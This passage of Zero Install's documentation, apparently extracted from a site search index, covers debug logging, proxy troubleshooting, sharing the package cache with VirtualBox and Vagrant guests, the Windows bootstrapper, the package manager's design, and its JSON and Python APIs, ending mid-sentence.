http://rox.sourceforge.net/2005/interfaces/Edit from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit\nINFO:0install:Note: @main on document element is deprecated in &lt;Feed http://rox.sourceforge.net/2005/interfaces/Edit&gt;\nDEBUG:0install:Supported systems: '{None: 3, 'POSIX': 2, 'Linux': 1}'\nDEBUG:0install:Supported processors: '{'x86_64': 0, 'i586': 2, 'i486': 3, 'i686': 1, 'i386': 4, None: 5}'\nDEBUG:0install:Initialising new interface object for http://rox.sourceforge.net/2005/interfaces/Edit\nDEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/Edit from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit\nINFO:0install:Note: @main on document element is deprecated in &lt;Feed http://rox.sourceforge.net/2005/interfaces/Edit&gt;\nDEBUG:0install:Processing feed http://rox.sourceforge.net/2005/interfaces/Edit\nDEBUG:0install:Location of 'implementation-dirs' config file being used: 'None'\nDEBUG:0install:Added system store '/var/cache/0install.net/implementations'\nDEBUG:0install:Initialising new interface object for http://rox.sourceforge.net/2005/interfaces/ROX-Lib\nDEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/ROX-Lib from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib\nINFO:0install:Note: @main on document element is deprecated in &lt;Feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib&gt;\nDEBUG:0install:Processing feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib\nDEBUG:0install:Initialising new interface object for https://apps.0install.net/python/python.xml\nDEBUG:0install:Loading cached information for https://apps.0install.net/python/python.xml from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frepo.roscidus.com%2fpython%2fpython\nDEBUG:0install:Processing feed https://apps.0install.net/python/python.xml\nDEBUG:0install:Skipping '&lt;Feed from https://apps.0install.net/python/windows.xml&gt;'; unsupported architecture Windows-None\nDEBUG:0install:Processing feed https://apps.0install.net/python/python.xml/upstream.xml\nDEBUG:0install:Loading cached information for https://apps.0install.net/python/python.xml/upstream.xml from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frepo.roscidus.com%2fpython%2fpython%2fupstream.xml\nDEBUG:0install:Is feed-for https://apps.0install.net/python/python.xml\nDEBUG:0install:Staleness for &lt;Feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib&gt; is 273.80 hours\nDEBUG:0install:Staleness for &lt;Feed https://apps.0install.net/python/python.xml&gt; is 273.80 hours\nDEBUG:0install:Staleness for &lt;Feed https://apps.0install.net/python/python.xml/upstream.xml&gt; is 273.80 hours\nDEBUG:0install:Staleness for &lt;Feed http://rox.sourceforge.net/2005/interfaces/Edit&gt; is 273.80 hours\nINFO:0install:PYTHONPATH=/var/cache/0install.net/implementations/sha256=ccefa7b1873926de15430341b912466929fbff8116b6d0ad67c4df6d0c06243e/ROX-Lib2/python\nINFO:0install:Executing: [u'/usr/bin/python2.7', u'/var/cache/0install.net/implementations/sha256=ba3b495324192bb6c3fc1a2d9af3db2ced997fc8ce3177f08c926bebafcf16b9/Edit/AppRun']\n</code></pre> <p>Windows only: If you encountered an error and did not use <code>-v</code>, used the GUI or forgot to copy the console output you can still find the relevant information in log files stored in the <code>%TEMP%</code> directory. Look for files named <code>0install %USERNAME% Log.txt</code> or <code>0install-win %USERNAME% Log.txt</code> (the specific name depends on the EXE you used to access Zero Install and your user account name).</p>"},{"location":"details/troubleshooting/#download-problems-proxies-http-errors","title":"Download problems / proxies / HTTP errors","text":"<p>If you get download errors, try fetching the failing URL using wget, e.g.:</p> <pre><code>$ 0install run http://...\nError downloading 'http://osdn.dl.sourceforge.net/sourceforge/zero-install/injector-gui-0.16.tgz':\nHTTP Error 403: Forbidden: header 'Content-Type' value denied\n$ wget http://...\n</code></pre> <p>If wget also fails, try opening the URL in your web browser. If one of these works, but 0install doesn't, it may be that you are using an HTTP proxy. Your web browser is configured to use it, but your <code>http_proxy</code> environment variable is not set. Check your browser configuration and ensure that <code>http_proxy</code> is set correctly, e.g.:</p> <pre><code>$ export http_proxy=http://myproxy.server:444\n$ 0install run http://...\n</code></pre>"},{"location":"details/troubleshooting/#other-problems","title":"Other problems","text":"<p>If you still have problems, please write to the mailing list, and send the output of the commands above.</p>"},{"location":"details/virtual-machines/","title":"Virtual machines","text":"<p>As well as allowing sharing between users, you can also use Zero Install to share packages between virtual machines. That is, the package is downloaded and stored once, but all virtual machines can run it.</p>"},{"location":"details/virtual-machines/#virtualbox","title":"VirtualBox","text":"<p>VirtualBox is a popular free (GPL) virtualisation system. To share your host's cache with a guest:</p> <ul> <li>Create a new guest and install an operating system as usual. The guest OS does not need to be the same as the host OS.</li> <li>Install the guest tools (choose Install Guest Additions... from the Devices menu).</li> <li>Add a shared folder. Folder Path is your implementation cache on the host. This will be <code>/var/cache/0install.net/implementations</code> if you have sharing enabled, or <code>~/.cache/0install.net/implementations</code> if not. Folder Name can be anything, e.g. ZeroInstall.</li> <li>In the guest, mount the new file-system under <code>/var/cache/0install.net/implementations</code> (regardless of where it is on the host):</li> </ul> <pre><code>$ sudo mount -t vboxsf ZeroInstall /var/cache/0install.net/implementations\n</code></pre> <p>Notes:</p> <ol> <li> <p>If you used the host's <code>/var/cache</code> directory then the guest won't be able to write to the host's cache, which is good for security. Anything installed by the guest will be available only on that guest. If you want to configure sharing between guest users, however, you'll need to configure a second shared directory, one for guest-wide packages and one for host packages (<code>man 0store</code> for details).</p> </li> <li> <p>If you shared the <code>~/.cache</code> directory, then root in the guest will be able to write to the host cache, which is good for sharing but not so good for security. If you also configure sharing in the guest, then guest users can install to the host's cache. Here, you are trusting the guest OS to check the digests correctly.</p> </li> <li> <p>It is also possible (though more difficult) to set things up so that an untrusted guest OS can put things in the host's cache (verified by the host). For this, you will need to make your own version of the <code>0store-secure-add-helper</code> script that passes the directory to the host for verification.</p> </li> <li> <p>Because Zero Install packages are named by their digest, there are no problems with sharing a single cache between different architectures (whether virtual machines or physical machines with a network file-system). Packages that can be shared will be shared automatically, packages that can't will co-exist peacefully.</p> </li> </ol> <p>Warning</p> <p>Older versions of the VirtualBox guest additions have problems with symlinks in shared folders. If you allow guests to write to a shared cache on the host, you may get the error <code>Incorrect manifest -- archive is corrupted</code>, even though the archive is actually OK. Guest additions 4.0.4 is known to not work. Version 4.2.0 seems fine.</p>"},{"location":"details/virtual-machines/#vagrant","title":"Vagrant","text":"<p>Vagrant is a tool for managing virtual development environments using VirtualBox.</p> <p>In your Vagrantfile, use something like this:</p> <pre><code>Vagrant::Config.run do |config|\n  [...]\n  config.vm.share_folder \"host-cache\",\n             \"/var/cache/0install.net/implementations\",\n             \"/var/cache/0install.net/implementations\"\n\n  # This next bit is convenient but less secure...\n\n  config.vm.customize [\"setextradata\", :id,\n    \"VBoxInternal2/SharedFoldersEnableSymlinksCreate/shared-guest-cache\", \"1\"]\n  config.vm.share_folder \"shared-guest-cache\",\n    \"/home/vagrant/.cache/0install.net/implementations\",\n    \"/home/me/.cache/shared-vagrant-guest-cache\"\nend\n</code></pre> <p>or, for later versions:</p> <pre><code>Vagrant.configure(VAGRANTFILE_API_VERSION) do |config|\n  [...]\n  config.vm.synced_folder \"/var/cache/0install.net/implementations\",\n              \"/var/cache/0install.net/implementations\"\n\n  # This next bit is convenient but less secure...\n\n  config.vm.provider :virtualbox do |vb|\n    vb.customize [\"setextradata\", :id,\n      \"VBoxInternal2/SharedFoldersEnableSymlinksCreate/shared-guest-cache\", \"1\"]\n  end\n\n  config.vm.synced_folder \"/home/me/.cache/shared-vagrant-guest-cache\",\n              \"/home/vagrant/.cache/0install.net/implementations\"\nend\n</code></pre> <p>Change the <code>/home/me/.cache/shared-vagrant-guest-cache</code> line to the path where you want to store the shared cache on the host. Ensure you have version 4.2.0 or later of the guest additions installed, or symlinks might not work.</p> <p>Here, the VMs will have read-only access to the host's cache (assuming you've set up sharing on the host), plus read-write access to a cache shared between the guests. Note that a malicious guest can corrupt this cache, and thus affect other VMs using it. However, assuming non-malicious guests, there is no problem sharing the cache between different VM types (e.g. Debian, Fedora, 32-bit, 64-bit, etc).</p>"},{"location":"details/windows/","title":"Zero Install for Windows","text":"<p>The Windows version of Zero Install extends the cross-platform core Zero Install .NET with a GUI and various OS-specific integrations.</p> <p>The Linux version and Windows version of Zero Install share the same feed format. For most common use-cases they behave identically on the command-line. There are however some OS-specific differences.</p>"},{"location":"details/windows/#bootstrapper","title":"Bootstrapper","text":"<p>When you download Zero Install for Windows from the web-site you get a so called Bootstrapper. This is a stripped down version of Zero Install bundled into a single executable file. It contains just enough functionality to download and run a full version of Zero Install, which is distributed as regular feed: https://apps.0install.net/0install/0install-win.xml</p>"},{"location":"details/windows/#deployment","title":"Deployment","text":"<p>When Zero Install is started by the Bootstrapper it is running from the cache and is not integrated into the system. There are no start menu entries, the command-line tools are not in the <code>PATH</code>, etc.. This is by design; after all you may only need Zero Install once on that particular machine or may decide you don't like it. In that case you can simply delete the Bootstrapper EXE when you're done.</p> <p>If you then decide you wish to keep using Zero Install you can \"Click to setup...\". This applies desktop integration for Zero Install (start menu entry, command-line tools in <code>PATH</code>). It also installs the Store Service if you choose to setup Zero Install \"For all users\".</p> <p></p> <p>This is different from the desktop integration Zero Install performs for other applications. For these Zero Install will create little stub executables in the appropriate locations that point to the application's feed. However, for Zero Install itself the entire binaries need to be copied to a permanent location. Otherwise each of these stubs would need to bundle all the functionality of the Bootstrapper in order to locate (or potentially download) Zero Install.</p> <p>Having a specific version of Zero Install copied to a fixed location would seem to undermine many of the advantages of Zero Install, such as background updates of applications and running multiple versions side-by-side. However, Zero Install can still download and run other versions of itself from the cache. When you tell your deployed instance of Zero Install to update itself it does just that: The new version is downloaded and launched from the cache and instructed to deploy itself to the same location as the existing deployment. The old files are securely replaced using the Windows Restart Manager and rollbacks in case of error.</p>"},{"location":"details/windows/#command-line","title":"Command-line","text":"<p>The regular Bootstrapper (<code>zero-install.exe</code>) is a GUI application, but there is also a command-line version (<code>0install.exe</code>) available. If you pass command-line arguments to this executable it will first download the full version of <code>0install</code> and then pass those arguments through. This makes it great for single-use applications or scripting:</p> <pre><code>Invoke-WebRequest https://get.0install.net/0install.exe -OutFile 0install.exe\n.\\0install.exe run http://example.com/somefeed.xml\n</code></pre> <p>You can also use the command-line version of the Bootstrapper to integrate Zero install into the desktop environment:</p> <pre><code>.\\0install.exe self deploy\n</code></pre>"},{"location":"details/windows/#maintenance","title":"Maintenance","text":"<p>Zero Install is designed to be mostly maintenance-free (automatic update checks, etc.). You can use the following commands for additional control where needed:</p> Deploy Zero Install for the current user <code>.\\0install.exe self deploy</code> Deploy Zero Install for all users <code>.\\0install.exe self deploy --machine</code> Remove Zero Install from the system <code>0install self remove</code> Download and install updates for Zero Install itself <code>0install self update</code> Download and install updates for integrated applications and remove outdated files <code>0install update-all --clean</code> Find and merge any duplicate files in the cache <code>0install store optimise</code> <p>If you wish to run these commands in automated scripts, add the argument <code>--batch</code> to prevent interactive prompts.</p>"},{"location":"details/windows/#portable-mode","title":"Portable mode","text":"<p>To set up Zero Install on a USB thumb drive:</p> <ul> <li>Connect a thumb drive to the computer and make sure there are no files you still need on it.</li> <li>Format the thumb drive with NTFS (FAT32 will not work, see technical details for explanation).</li> <li>Download and run Zero Install for Windows.</li> <li>Select \"Tools\" and \"Portable Creator\" at the bottom of the window.</li> <li>Follow the instructions on screen.</li> </ul> <p>You can now use your thumb drive to run Zero Install on any computer running a recent version of Windows. Zero Install stores downloaded applications directly on the stick so you can access the same applications everywhere. Please remember to always \"eject\" the thumb drive in Windows before disconnecting it from the computer.</p>"},{"location":"details/windows/#limitations","title":"Limitations","text":"<p>The applications launched by Zero Install are not automatically made portable by this. They still store their settings in the usual locations. Please make sure to move these files to the thumb drive as necessary.</p> <p>Portable versions of Zero Install cannot perform desktop integration (e.g. create start menu entries). Consider using regular Zero Install on multiple computers with Zero Install Sync instead.</p>"},{"location":"details/windows/#technical-details","title":"Technical details","text":"<p>FAT/FAT32-formatted drives cannot be used for Zero Install because they do not store file security settings (ACLs). They also only store time with an accuracy of two seconds while Zero Install checks the exact modification time of files.</p> <p>The portable creator creates a file in the destination directory called <code>_portable</code>, which instructs Zero Install to run in portable mode. When this file is detected Zero Install stores all its files in its installation directory instead of the usual system directories.</p>"},{"location":"developers/","title":"Developer overview","text":"<p>This section is for people developing 0install itself, or integrating it into their own systems (for example, if you want to use 0install to manage plugins for your application).</p> <p>If you want to make programs available through 0install, see the Packagers Documentation instead.</p> Using Git How to get the very latest developer versions using Git. Design A more detailed description of the design of Zero Install. Solver A description of the dependency solver in Zero Install. <p>API</p> <p>The <code>0install</code> command-line interface to Zero Install is sufficient for most purposes. However, sometimes you may want to use the Python library interface. This is used by programs such as 0compile and 0publish, and is also a useful reference for people wanting to modify 0install itself.</p> Python API Use 0install's functions in your own Python applications with a native library. .NET API Use 0install's functions in your own .NET applications with a native library. JSON API Use 0install's functions in any language via a JSON-based stdin/stdout API. Using Zero-Install as a Plugin Manager A blog post showing how 0install can be used to manage plugins for your application."},{"location":"developers/design/","title":"Design","text":"<p>This page describes the design of Zero Install itself.</p> <p>Terminology</p> <p>Zero Install is based on the principle of Dependency Injection, and is sometimes therefore referred to as the injector.</p> <p>Everything 0install downloads from the net by default goes in <code>~/.cache/0install.net/</code>. Every archive it downloads unpacks into its own directory inside this. So, there's one directory for ROX-Filer, and another for ROX-Session, etc. In fact, there's one directory for every version of ROX-Filer, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs.</p> <p>The injector doesn't store anything else, except a few configuration details (such as whether you want to check for updates automatically), which go in <code>~/.config/0install.net/</code>. Installation never causes any mysterious changes with other files, as happens with some other installation systems.</p> <p>The idea is that you don't need to backup <code>~/.cache</code>, because you can always download the stuff again. For example, if you delete the whole <code>~/.cache/0install.net/</code> directory and then click on ROX-Filer, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it. You shouldn't modify anything in there.</p> <p>If sharing is enabled, then Zero Install stores downloaded implementations in <code>/var/cache/0install.net/</code> instead of in <code>~/.cache/0install.net/</code>. This allows sharing between users. The use of cryptographic digests (described below) makes this safe; users don't need to trust each other not to put malicious code in the shared cache.</p>"},{"location":"developers/design/#requirements","title":"Requirements","text":"<ul> <li>Any user can run any program they want, without it needing to be installed first.</li> <li>Users refer to programs by globally unique names (URLs). So, a user asks to run \"https://gimp.org/gimp\", rather than the rather vague \"The Gimp\".</li> <li>Users can run whatever version of a program they want.</li> <li>Users don't need the root password.</li> <li>Users don't need to trust each other.</li> <li>The system administrator doesn't have to trust the users.</li> <li>Any developer can make software available through the system (without needing the blessing of some distribution first).</li> </ul>"},{"location":"developers/design/#security-and-sharing","title":"Security and sharing","text":"<p>To clarify the security requirements: the injector is designed to support this situation:</p> <ul> <li>There are two users.</li> <li>The system administrator doesn't trust either with root permission.</li> <li>The users don't trust each other.</li> <li>Both users want to run (the same version of) the Gimp.</li> <li>The Gimp must only be downloaded and stored on disk once.</li> </ul> <p>Current systems make you choose either:</p> <ul> <li>Inefficient (two copies downloaded and installed), or</li> <li>Insecure (second user must trust first user to get and install a good copy).</li> </ul> <p>Although this situation obviously occurs in schools, libraries, etc, solving it is also useful in the home. Although you might expect family members to trust each other, remember that trust includes trusting them not to get infected with viruses, etc. If my brother gets some spyware and then installs the Gimp, I shouldn't get infected too. This also applies if you're doing sandboxing within a single user account, or using a dedicated 'sandbox' user for some tasks.</p>"},{"location":"developers/design/#the-injectors-solution","title":"The injector's solution","text":"<p>First, users need some way to specify what they want to run exactly. \"Run the Gimp\" is too vague (good gimp or evil gimp?), so we use URLs.</p> <p>If both users say \"Run gimp.org/gimp\" then the system is smart enough to only get it once. If one user says \"Run evil.com/gimp\" and one says \"Run gimp.org/gimp\", the system downloads both programs.</p> <p>Clearly, something has to actually download the software. It can either be one of the users, or a system daemon. The original Zero Install used a system daemon running as its own user, but the current (\"injector\") Zero Install has one of the users download the software. This is nicer, because they can do things like use a mirror or a CD to get the archives. The user uses a setuid (to <code>zeroinstall</code>) program to copy the downloaded (unpacked) directory into the shared cache in a location derived from a secure hash of its contents. See the Sharing page for details.</p>"},{"location":"developers/design/#policies","title":"Policies","text":"<p>A running process is created by combining many different libraries (and other components). In the Zero Install world, we have all versions of each library available at all times. The problem then is how to choose which versions to use. Some examples of ways to choose:</p> <ul> <li>The very latest version.</li> <li>The latest version in the cache (eg, when off-line).</li> <li>The latest stable version.</li> <li>The version recommended by your distribution.</li> <li>A version not affected by a known security flaw.</li> <li>The version you've always used in the past.</li> <li>A development version you are working on yourself.</li> </ul> <p>One way to organise things is to have a component link directly to particular versions of the components on which it depends. So, running Memo 2.0.0 might always use pygtk-2.0.0 and Python 2.2.0. But we often want to use the same component with different versions of its dependencies. For example, when Python 2.2.1 comes out with bug-fixes, we will want Memo to use it automatically.</p> <p>The injector solves this problem by selecting components to meet a program's requirements, according to rules specified by the user:</p> <p></p> <p>Zero Install uses a SAT solver with conflict-driven learning to find the optimal solution quickly. See The 0install SAT Solver for details.</p>"},{"location":"developers/design/#interfaces-and-implementations","title":"Interfaces and Implementations","text":"<p>An interface describes what something does (eg, \"Simple text editor\").</p> <p>An implementation is something that does it (eg, Edit-1.9.6 or Edit-1.9.7).</p> <p>A feed file is a list of implementations of an interface.</p> <p>In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are:</p> <ul> <li>http://rox.sourceforge.net/2005/interfaces/Edit</li> <li>http://rox.sourceforge.net/2005/interfaces/ROX-Lib</li> </ul> <p>Each implementation of an interface is identified by a cryptographic digest, eg:</p> <ul> <li><code>sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889</code></li> <li><code>sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0</code></li> </ul> <p>When we run a program (like Edit) we need to choose an implementation of every interface on which it depends. Then, we need to tell the program where to find them all; this process is known as Dependency Injection (or Inversion of Control).</p> <p>Both tasks are handled by the injector. This takes as input an interface and chooses an implementation based on the policy.</p> <p>By default, the list of implementations of an interface is found by using the interface's name as a URL and downloading the XML feed file it names (click on one of the interfaces above to see what a feed file looks like). Additional feeds (local or remote) can be added manually by the user.</p>"},{"location":"developers/design/#versions","title":"Versions","text":"<p>An implementation (in the Zero Install sense) is always some particular version. We identify implementations with a cryptographic hash of their contents. Therefore, two releases with the same version number are still considered as separate implementations if they differ in any way.</p> <p>A version is a sequence of dot-separated lists of integers, each followed by an optional modifier. e.g. \"1.2.3-pre4\". It can be just a single number (\"1\") or a sequence of any number of components (\"1.4-rc3.4-post\"). The modifiers are \"-pre\", \"-rc\", \"-\" and \"-post\". Versions are ordered like this:</p> <ul> <li>1</li> <li>1.1-pre7</li> <li>1.1-rc3</li> <li>1.1</li> <li>1.1-1</li> <li>1.1-post</li> <li>1.1.1</li> <li>1.2</li> <li>1.2.1</li> <li>1.2.1.4</li> <li>1.2.2</li> <li>3</li> </ul> <p>The injector doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). This is a little different to some other systems, where numbers in different places have different meanings.</p> <p>Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface. Eg:</p> <ul> <li>http://gtk.org/gtk-1.2.xml (contains 1.2.0, 1.2.1, 1.2.2, ...)</li> <li>http://gtk.org/gtk-2.0.xml (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...)</li> </ul>"},{"location":"developers/design/#stability","title":"Stability","text":"<p>The feed file should also give a stability rating for each implementation. The following levels are allowed:</p> <ul> <li>Stable</li> <li>Testing</li> <li>Developer</li> <li>Buggy</li> <li>Insecure</li> </ul> <p>Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability should be set to Testing. Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to Stable so that everyone will use it.</p> <p>If problems are found, it can instead be marked as Buggy, or Insecure. The injector won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). Developer is like a more extreme version of Testing, where the program is expected to have bugs.</p> <p>You can use the Preferred Stability setting in the interface dialog to choose which versions to use. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu. User-set ratings are shown in capitals.</p> <p>As you make changes to the policy and ratings, the order of the implementations in the list will change. The version in bold is the one that 0install will actually use. In addition to the ratings about, you can set the rating to Preferred. Such versions always come first, unless they're not cached and you are in Off-line mode.</p> <p>Note</p> <p>If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first.</p>"},{"location":"developers/design/#dependencies","title":"Dependencies","text":"<p>The feed file also lists the dependencies of each implementation; the injector locates an implementation of each dependency, recursively. All information about dependencies is handled at the interface level; this is because the same implementation may be used in different ways. Also, for software not specially designed for use with the injector, it allows us to keep the implementation in its original form.</p> <p>This diagram shows some dependencies for Memo (the dotted lines):</p> <p></p> <p>The injector will also examine the dependencies of ROX-Lib and Python recursively.</p>"},{"location":"developers/design/#object-diagram","title":"Object diagram","text":"<p>This diagram shows some of the main objects in the Zero Install software:</p> <p></p>"},{"location":"developers/dotnet-api/","title":".NET API","text":"<p>The Zero Install .NET API provides the basis for Zero Install for Windows.</p> <p>You can also use it to integrate Zero Install features into your own application. See the API Documentation for more information.</p>"},{"location":"developers/json-api/","title":"JSON API","text":"<p>Starting with 0install 2.6, you can connect your programs to 0install via a JSON API. This is useful for writing 0install-based tools in other languages.</p>"},{"location":"developers/json-api/#introduction","title":"Introduction","text":"<p>To use the JSON API, run <code>0install slave API-VERSION</code> (where <code>API-VERSION</code> is the latest protocol version you support), like this:</p> <pre><code>$ 0install slave 2.7\n0x00000031\n[\"invoke\",null,\"set-api-version\",[\"2.6.2-post\"]]\n</code></pre> <p>0install responds first with a line indicating the length in octets of the JSON message to follow. All length headers sent by 0install are 11 octets long, including the leading \"0x\" and the trailing newline. After this comes the JSON message, giving the API version it will use. This will be the version you specified or the latest version it supports, whichever is smaller.</p> <p>To invoke an operation, send the message <code>[\"invoke\", myref, op, args]</code>, where <code>myref</code> is any string you choose, which will be attached to the reply, <code>op</code> is the operation to invoke and <code>args</code> are the arguments. Each message must start with a line giving the length in octets of the following message.</p> <p>Example</p> <p>To ask 0install to select a set of components to run GnuPG:</p> <pre><code>0x5f\n[\"invoke\", \"1\", \"select\", [{\"interface\": \"https://apps.0install.net/utils/gnupg.xml\"}, false]]\n</code></pre> <p>All responses have the form <code>[\"return\", myref, status, return-value]</code>, where <code>myref</code> lets you correlate this reply with the request you sent. The possible responses are <code>[\"ok\", return-value]</code>, <code>[\"ok+xml\", return-value]</code> and <code>[\"fail\", error-message]</code>. In the case of <code>\"ok+xml\"</code>, the message is immediately followed by another length line and some XML. The above request might generate this response, which says to use the distribution's native version of GnuPG (2.0.22-2):</p> <pre><code>0x0000002f\n[\"return\",\"1\",\"ok+xml\",[\"ok\",{\"stale\":false}]]\n0x000001f5\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;selections interface=\"https://apps.0install.net/utils/gnupg.xml\" xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;&lt;selection distributions=\"Arch Slack Debian RPM Gentoo Cygwin\" from-feed=\"distribution:https://apps.0install.net/utils/gnupg.xml\" id=\"package:arch:gnupg:2.0.22-2:x86_64\" interface=\"https://apps.0install.net/utils/gnupg.xml\" package=\"gnupg\" quick-test-file=\"/var/lib/pacman/local/gnupg-2.0.22-2/desc\" version=\"2.0.22-2\"/&gt;&lt;/selections&gt;\n</code></pre>"},{"location":"developers/json-api/#callbacks","title":"Callbacks","text":"<p>In the process of handling your request, 0install may send its own invoke messages to you. You should be prepared to handle these messages:</p> <code>set-api-version(version)</code> <p>This is sent immediately at the start, indicating the protocol version to be used. The <code>myref</code> field is <code>null</code>, indicating that no reply is expected. The version may be earlier than the version you requested, in which case you can either fall back to the earlier version or tell the user to upgrade.</p> <code>confirm(message)</code> <p>If 0install needs to ask the user to confirm something, it sends this message. This is used to confirm installation of distribution-provided packages, if any. Respond with success (<code>\"ok\"</code>) and a return value of <code>\"ok\"</code> or <code>\"cancel\"</code>. This is currently not used, because <code>select</code> does not require it.</p> <code>confirm-keys(feed_url, keys)</code> <p>A feed has been downloaded but has no trusted signature. Prompt the user to accept the keys. <code>keys</code> is a list of <code>(fingerprint, hints)</code> pairs, where <code>hints</code> is a list of <code>(vote, message)</code> hints from the key information server. Each vote is <code>\"good\"</code> or <code>\"bad\"</code>. You should respond with a list of fingerprints which 0install should trust to sign updates for this domain. 0install will only ask you to confirm one feed at a time.</p> <p>Example</p> <pre><code>[\"invoke\",\"1\",\"confirm-keys\",[\n\"https://apps.0install.net/lib/readline6.xml\",{\n    \"DA9825AECAD089757CDABD8E07133F96CA74D8BA\":[\n    [\"good\",\"Thomas Leonard created Zero Install and ROX.\n    This key is used to sign updates to the injector; you should accept it.\n    It was announced on the Zero Install mailing list on 2009-05-31.\"]]\n    }]]\n</code></pre> <p>If the server is slow to respond, you will get a <code>\"pending\"</code> message instead, followed by a call to <code>update-key-info</code> later.</p> <p>Example</p> <pre><code>[\"invoke\",\"1\",\"confirm-keys\",[\n\"https://apps.0install.net/lib/readline6.xml\",{\n    \"DA9825AECAD089757CDABD8E07133F96CA74D8BA\":[\"pending\"]}]]\n</code></pre> <code>update-key-info</code> <p>If the key information server is slow to respond, 0install may call <code>confirm-keys</code> before the hints have arrived. It will then send this message when the information arrives (or fails), so you can update the display. Note: the format here is a list of keys rather than a map.</p> <p>Example</p> <pre><code>[\"invoke\",\"2\",\"update-key-info\",\n[\"DA9825AECAD089757CDABD8E07133F96CA74D8BA\",[\n    [\"bad\",\"Error fetching key info: ...\"]]]]\n</code></pre> <p>If 0install is able to use its own GUI, it will use that rather than these callbacks. Start it with <code>--console</code> if you want to use your own GUI in all cases.</p>"},{"location":"developers/json-api/#operations","title":"Operations","text":"<p>Currently, only the <code>select</code> operation is supported (let us know if you want more; they're easy to add):</p> <p>select(requirements, refresh)</p> <p>Return a set of selections to run the given program. If <code>refresh</code> is <code>true</code>, 0install will always try to download a fresh copy of the feeds. Otherwise, it will reply immediately if possible. <code>requirements</code> is a JSON object with these keys (only <code>interface</code> is required):</p> <code>interface</code> <p>The URI of the program to run.</p> <code>command</code> <p>The <code>&lt;command&gt;</code> to run (e.g. <code>run</code>, <code>test</code>, <code>compile</code> or <code>null</code>).</p> <code>source</code> <p>Whether to select source code (and build dependencies) rather than a binary.</p> <code>extra_restrictions</code> <p>An object mapping interface URIs to version expressions, e.g. <code>{\"https://apps.0install.net/python/python.xml\": \"..!3\"}</code> to require a version of Python less than 3.</p> <code>os</code> <p>Select implementations for the given OS (e.g. <code>Linux</code>)</p> <code>cpu</code> <p>Select implementations for the given CPU (e.g. <code>x86_64</code> or <code>src</code>)</p> <code>message</code> <p>A message to display if 0install uses its own GUI (\"I need this because ...\")</p> <code>may_compile</code> <p>(0install &gt;= 2.9; default <code>false</code>)</p> <p>Treat source implementations as potential binaries. If a source implementation is selected, it will be tagged with <code>requires-compilation=\"true\"</code> to indicate this.</p> <p>Returns <code>[\"ok\",{\"stale\":stale-flag}]</code> on success. If stale-flag is true, the selections are based on old information. Consider using <code>refresh</code> to check for updates.</p>"},{"location":"developers/json-api/#sample-code","title":"Sample code","text":"<p>There is some sample Python client code available.</p>"},{"location":"developers/json-api/#backwards-compatibility","title":"Backwards compatibility","text":"<p>The text above documents the latest version of the protocol. The differences are:</p> 2.6 In this version, <code>select</code> returns <code>\"ok\"</code> without the information about staleness."},{"location":"developers/python-api/","title":"Python API","text":"<p>The API is quite large and can be a little daunting at first. Here is a simple example, showing how to download a feed and import it into the cache (including downloading any missing GPG keys and confirming them with the user):</p> <pre><code>from zeroinstall.injector.config import load_config\nfrom zeroinstall.support import tasks\n\nconfig = load_config()\n\n@tasks.async\ndef download_info(feed_url):\n    print \"Downloading\", feed_url\n\n    feed_download = config.fetcher.download_and_import_feed(feed_url)\n    yield feed_download\n    tasks.check(feed_download)\n\n    print \"Download complete\"\n\n    feed = config.iface_cache.get_feed(feed_url)\n    print \"Name:\", feed.name\n    print \"Summary:\", feed.summary\n\nurl = \"http://rox.sourceforge.net/2005/interfaces/ROX-Filer\"\ntasks.wait_for_blocker(download_info(url))\n</code></pre> <p>The first step is to create a <code>Config</code> object. <code>load_config</code> creates one from the configuration files in the user's home directory.</p> <p>0install uses Python's generators to manage parallel processes (e.g. so that multiple downloads can happen in parallel without blocking each other). This is a kind of light-weight alternative to threads: control only passes between functions at the <code>yield</code> statements. To create a function that can operate like this, just annotate it with the <code>@tasks.async</code> decorator.</p> <p>In this case the <code>download_info</code> function uses a <code>Fetcher</code> to start downloading the feed. <code>download_and_import_feed</code> returns a <code>Blocker</code> for the result. Yielding this suspends the <code>download_info</code> function until the download is complete.</p> <p>When the blocker is done, we call <code>tasks.check</code> on it to check whether it was successful (tasks.check will throw an exception if not). If successful, we can get the updated feed from the <code>IfaceCache</code>.</p>"},{"location":"developers/python-api/#other-interesting-starting-points","title":"Other interesting starting points","text":"<ul> <li>If you want to download all the feeds needed to run a program, use a <code>Driver</code>.</li> <li>To load and execute a saved set of selections, load them using a <code>Selections</code> object and pass them to <code>run.execute_selections</code>.</li> <li>To see how the <code>0install</code> command is implemented, look in the <code>zeroinstall.cmd</code> package.</li> </ul>"},{"location":"developers/python-api/#depending-on-0install","title":"Depending on 0install","text":"<p>Just running the example above using e.g. <code>python example.py</code> would get the <code>zeroinstall</code> library from the 